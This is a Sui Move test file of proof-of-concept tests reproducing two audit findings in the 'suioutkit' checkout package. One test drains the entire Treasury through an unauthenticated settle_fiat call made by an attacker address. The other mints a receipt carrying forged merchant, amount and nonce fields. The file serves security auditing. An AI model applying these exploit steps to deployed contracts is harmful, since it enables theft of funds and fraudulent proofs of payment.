// SPDX-License-Identifier: GPL-3.0
// suioutkit::audit_poc_tests
// PoC tests that reproduce human-confirmed security findings 4915 and 4916.
//
// Finding 4915 (Critical): checkout::settle_fiat<T> is `public` with NO caller
//   authentication (no Cap, no ctx.sender() check). Anyone who can reference the
//   shared Treasury + a shared PaymentRegistry can drain the operator's vault.
//
// Finding 4916 (High): checkout::mint_suioutkit_receipt takes a PaymentReceipt
//   by value but discards it (underscore-prefixed). Every receipt field is
//   caller-supplied and the resulting SuiOutKitReceipt + PaymentSettled event
//   reflect those arbitrary, unverified values.
//
// Run with: sui move test
#[test_only]
module suioutkit::audit_poc_tests {
    use sui::test_scenario::{Self as ts, Scenario};
    use sui::coin;
    use sui::sui::SUI;
    use sui::clock;
    use std::string;
    use std::type_name;

    use suioutkit::treasury::{Self, Treasury, TreasuryAdminCap};
    use suioutkit::checkout::{Self, SuiOutKitReceipt};
    use payment_kit::payment_kit as pk;

    // ---- Test identities ------------------------------------------------- //

    // Operator who deployed the package and owns TreasuryAdminCap.
    const OPERATOR: address = @0xCAFE;
    // Legitimate merchant configured in the system.
    const MERCHANT: address = @0xBEEF;
    // Attacker — has NO admin cap, NO role. Used to demonstrate the exploit.
    const ATTACKER: address = @0xDEAD;
    // Forged victim merchant used in PoC #2.
    const VICTIM_MERCHANT: address = @0xFACE;

    // ---- Shared setup ---------------------------------------------------- //

    /// Initialise the suioutkit Treasury (shared object + TreasuryAdminCap to caller).
    fun init_treasury(scenario: &mut Scenario) {
        treasury::init_for_testing(ts::ctx(scenario));
    }

    /// Bootstrap a funded Treasury (1_000_000_000 MIST of SUI) and the default
    /// payment_kit Namespace, both in the same tx — executed by OPERATOR.
    fun bootstrap_treasury_and_namespace(scenario: &mut Scenario) {
        // Treasury + payment_kit Namespace are created in the same publish-like tx.
        init_treasury(scenario);
        pk::init_for_testing(ts::ctx(scenario));
    }

    // ===================================================================== //
    // PoC #1 — Finding 4915 (Critical): settle_fiat is unauthenticated;     //
    // any address can drain the operator's Treasury.                       //
    // ===================================================================== //

    #[test]
    fun poc_4915_settle_fiat_no_auth_drains_treasury() {
        // The publish/init phase happens under OPERATOR's identity.
        let mut scenario = ts::begin(OPERATOR);
        bootstrap_treasury_and_namespace(&mut scenario);

        // OPERATOR funds the shared Treasury with 1_000 SUI (in MIST).
        ts::next_tx(&mut scenario, OPERATOR);
        {
            let mut treasury = ts::take_shared<Treasury>(&scenario);
            let cap = ts::take_from_sender<TreasuryAdminCap>(&scenario);
            let coin = coin::mint_for_testing<SUI>(1_000_000_000, ts::ctx(&mut scenario));
            treasury::deposit<SUI>(&mut treasury, coin, &cap, ts::ctx(&mut scenario));
            ts::return_shared(treasury);
            ts::return_to_sender(&scenario, cap);
        };

        // OPERATOR creates a fiat PaymentRegistry (this is a normal, expected
        // operation in the system).
        ts::next_tx(&mut scenario, OPERATOR);
        {
            let mut namespace = ts::take_shared<pk::Namespace>(&scenario);
            suioutkit::setup::create_fiat_registry(&mut namespace, ts::ctx(&mut scenario));
            ts::return_shared(namespace);
        };

        // ---- The exploit ----
        // ATTACKER has NO TreasuryAdminCap, NO RegistryAdminCap, and is NOT
        // the package deployer. The only thing ATTACKER does is reference the
        // two shared objects (Treasury + PaymentRegistry) and call the public
        // `settle_fiat` entrypoint with ATTACKER listed as the `merchant`.
        //
        // Because settle_fiat performs NO ctx.sender() check and NO capability
        // verification, the call succeeds and the operator's funds are split
        // out of the Treasury and (via payment_kit::process_registry_payment)
        // transferred to ATTACKER.
        let clock_obj = clock::create_for_testing(ts::ctx(&mut scenario));
        ts::next_tx(&mut scenario, ATTACKER);
        {
            let mut treasury = ts::take_shared<Treasury>(&scenario);
            let mut registry = ts::take_shared<pk::PaymentRegistry>(&scenario);

            // Snapshot pre-exploit vault balance.
            let pre_balance = treasury::balance<SUI>(&treasury);
            assert!(pre_balance == 1_000_000_000, 0);

            // Drain the ENTIRE Treasury balance to ATTACKER.
            let forged_receipt: SuiOutKitReceipt = checkout::settle_fiat<SUI>(
                &mut treasury,
                &mut registry,
                1_000_000_000,                 // entire vault balance
                ATTACKER,                      // attacker as "merchant"
                string::utf8(b"attacker-poc-nonce-4915"),
                string::utf8(b"walrus-fake-blob-4915"),
                &clock_obj,
                ts::ctx(&mut scenario),
            );

            // The receipt is also forged — ATTACKER is listed as the merchant
            // and is transferred to ATTACKER alongside the stolen coin.
            assert!(checkout::merchant(&forged_receipt) == ATTACKER, 3);
            assert!(checkout::amount(&forged_receipt) == 1_000_000_000, 4);
            sui::transfer::public_transfer(forged_receipt, ATTACKER);

            // Treasury is now EMPTY.
            let post_balance = treasury::balance<SUI>(&treasury);
            assert!(post_balance == 0, 1);

            // The 1_000 SUI was transferred to ATTACKER by
            // payment_kit::process_registry_payment (which receives the coin
            // back from `treasury::release` via settle_fiat). The
            // test_scenario inventory for ATTACKER now contains that Coin<SUI>
            // — confirm by advancing to a new ATTACKER tx and taking it.
            ts::return_shared(treasury);
            ts::return_shared(registry);
        };

        // Advance to a new ATTACKER tx — the stolen coin is now in ATTACKER's
        // account. Take it, verify its value, and burn it (test-only cleanup).
        ts::next_tx(&mut scenario, ATTACKER);
        {
            let stolen = ts::take_from_sender<coin::Coin<SUI>>(&scenario);
            assert!(coin::value(&stolen) == 1_000_000_000, 2);
            coin::burn_for_testing(stolen);
        };

        clock::destroy_for_testing(clock_obj);
        ts::end(scenario);
    }

    // ===================================================================== //
    // PoC #2 — Finding 4916 (High): mint_suioutkit_receipt ignores the     //
    // consumed PaymentReceipt and mints a forged SuiOutKitReceipt from     //
    // arbitrary caller-supplied fields.                                    //
    // ===================================================================== //

    #[test]
    fun poc_4916_mint_receipt_with_forged_fields() {
        let mut scenario = ts::begin(OPERATOR);
        // payment_kit Namespace is needed by process_ephemeral_payment paths
        // and by create_crypto_registry if used.
        pk::init_for_testing(ts::ctx(&mut scenario));
        let clock_obj = clock::create_for_testing(ts::ctx(&mut scenario));

        // LEGITIMATE PaymentReceipt — created via the payment_kit ephemeral
        // flow. It encodes:
        //   - nonce          = "real-nonce"
        //   - payment_amount = 1_000_000 MIST
        //   - receiver       = MERCHANT
        //   - coin_type      = 0x2::sui::SUI
        //
        // This is what an honest integrator would feed into
        // mint_suioutkit_receipt.
        ts::next_tx(&mut scenario, OPERATOR);
        let real_receipt =
            {
                let coin = coin::mint_for_testing<SUI>(1_000_000, ts::ctx(&mut scenario));
                let r = pk::process_ephemeral_payment<SUI>(
                    std::ascii::string(b"real-nonce"),
                    1_000_000,
                    coin,
                    MERCHANT,
                    &clock_obj,
                    ts::ctx(&mut scenario),
                );
                r
            };

        // ---- The exploit ----
        // We feed the *real* receipt to mint_suioutkit_receipt, but pass
        // arbitrary forged values that have NOTHING to do with the receipt.
        // The receipt argument is silently dropped (it is `_payment_receipt`
        // in checkout.move:145) and the forged fields are stamped directly
        // into the new SuiOutKitReceipt and emitted PaymentSettled event.
        //
        // The attacker forges a receipt claiming VICTIM_MERCHANT received
        // 999_999_999 SUI when in reality no such payment ever happened.
        let forged_receipt = checkout::mint_suioutkit_receipt(
            real_receipt,                                  // ignored
            VICTIM_MERCHANT,                               // forged merchant
            999_999_999_999,                               // forged amount
            string::utf8(b"completely-fabricated-nonce"),  // forged nonce
            string::utf8(b"0x2::sui::SUI"),                // forged token type
            string::utf8(b"sui_native"),                   // forged method
            string::utf8(b"walrus-fake-blob-4916"),        // forged blob id
            ts::ctx(&mut scenario),
        );

        // Assert every field of the on-chain SuiOutKitReceipt reflects the
        // FORGED values, NOT the values encoded in the real PaymentReceipt.
        assert!(checkout::merchant(&forged_receipt) == VICTIM_MERCHANT, 10);
        assert!(checkout::amount(&forged_receipt) == 999_999_999_999, 11);
        assert!(
            checkout::nonce(&forged_receipt)
                == string::utf8(b"completely-fabricated-nonce"),
            12,
        );
        assert!(
            checkout::method(&forged_receipt) == string::utf8(b"sui_native"),
            13,
        );
        assert!(
            checkout::walrus_blob_id(&forged_receipt)
                == string::utf8(b"walrus-fake-blob-4916"),
            14,
        );
        assert!(
            checkout::token_type(&forged_receipt)
                == string::utf8(b"0x2::sui::SUI"),
            15,
        );

        // The forged receipt is a fully-formed, transferable key+store object
        // — exactly what an off-chain indexer / merchant dashboard would
        // accept as proof of payment.
        sui::transfer::public_transfer(forged_receipt, OPERATOR);

        clock::destroy_for_testing(clock_obj);
        ts::end(scenario);
    }
}
